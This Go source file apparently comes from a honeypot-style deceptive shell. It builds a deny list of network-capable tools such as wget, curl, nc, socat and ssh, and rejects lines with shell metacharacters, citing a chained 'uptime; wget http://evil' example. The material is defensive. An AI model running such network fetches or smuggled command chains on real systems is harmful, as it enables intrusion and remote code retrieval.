package deception

import (
	"strings"

	"github.com/mirage-source/mirage-core/internal/shell"
)

// egressCapableCommands are commands this fallback must never answer for,
// even though the interpreter has no builtin for them.
//
// The reasoning is the rules of engagement in SECURITY.md, not a technical
// limit: no real packet is ever sent either way, but a plausible
// "--2026-08-26-- connecting to example.com... 200 OK" is a fabricated claim
// that a network operation succeeded. That is the same class of thing the
// audit flagged about FAKE_SUCCESS, and it is out of scope here.
//
// Every command in internal/shell/no_egress_test.go's
// TestNetworkFlavoredCommandsNeverAttemptRealEgress list MUST appear here,
// so that test keeps passing unchanged with the fallback switched on;
// completion_test.go asserts exactly that, against a copy of its list.
var egressCapableCommands = map[string]struct{}{
	// Transfer / remote-access tools.
	"wget": {}, "curl": {}, "nc": {}, "ncat": {}, "netcat": {}, "socat": {},
	"ssh": {}, "scp": {}, "sftp": {}, "rsync": {}, "telnet": {}, "rlogin": {},
	"rsh": {}, "ftp": {}, "tftp": {}, "lftp": {},
	// Name resolution and reachability.
	"nslookup": {}, "dig": {}, "host": {}, "ping": {}, "ping6": {},
	"traceroute": {}, "tracepath": {}, "mtr": {},
	// Text-mode browsers.
	"lynx": {}, "links": {}, "elinks": {}, "w3m": {},
	// Package managers -- all fetch from a network.
	"apt": {}, "apt-get": {}, "aptitude": {}, "yum": {}, "dnf": {}, "apk": {},
	"pacman": {}, "zypper": {}, "pip": {}, "pip3": {}, "npm": {}, "yarn": {},
	"gem": {}, "cargo": {}, "composer": {}, "go": {}, "git": {}, "svn": {},
	// Interpreters and shells -- arbitrary code, including sockets.
	"python": {}, "python2": {}, "python3": {}, "perl": {}, "ruby": {},
	"php": {}, "node": {}, "nodejs": {}, "lua": {}, "sh": {}, "bash": {},
	"zsh": {}, "dash": {}, "ksh": {}, "eval": {}, "exec": {},
}

// shellMetacharacters are the operators evalLine understands. A completion
// replaces the output of the entire line, so it may only be attempted when
// the line is one simple command -- otherwise `uptime; wget http://evil`
// would have its wget stage silently answered by a model instead of by the
// interpreter that knows to refuse it.
const shellMetacharacters = ";&|<>$`()"

// ShouldAttemptCompletion reports whether line is a single simple command
// that the interpreter has no builtin for and that is safe to answer with a
// generated response, returning the command name when it is.
//
// It is deliberately conservative on every axis: any metacharacter, any
// known builtin, and any egress-capable tool all fall through to the
// interpreter's existing behaviour, unchanged.
func ShouldAttemptCompletion(line string) (name string, ok bool) {
	if strings.ContainsAny(line, shellMetacharacters) {
		return "", false
	}
	fields := strings.Fields(line)
	if len(fields) == 0 {
		return "", false
	}
	name = fields[0]
	if shell.IsKnownBuiltin(name) {
		return "", false
	}
	if _, bad := egressCapableCommands[name]; bad {
		return "", false
	}
	return name, true
}
